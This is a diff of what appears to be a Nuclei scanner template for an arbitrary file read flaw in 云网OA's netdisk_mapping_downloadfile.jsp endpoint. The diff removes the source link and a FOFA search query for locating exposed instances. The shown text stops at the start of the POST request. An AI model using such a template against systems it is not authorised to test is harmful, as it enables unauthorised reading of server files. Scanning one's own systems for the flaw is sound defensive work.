@@ -3,12 +3,8 @@ info:
   name: 云网OA netdisk_mapping_downloadfile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/odkmzmysxotcdfup'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: odkmzmysxotcdfup
-    fofa: body="云网OA"
 http:
 - raw:
   - 'POST /public/netdisk_mapping_downloadfile.jsp HTTP/1.1
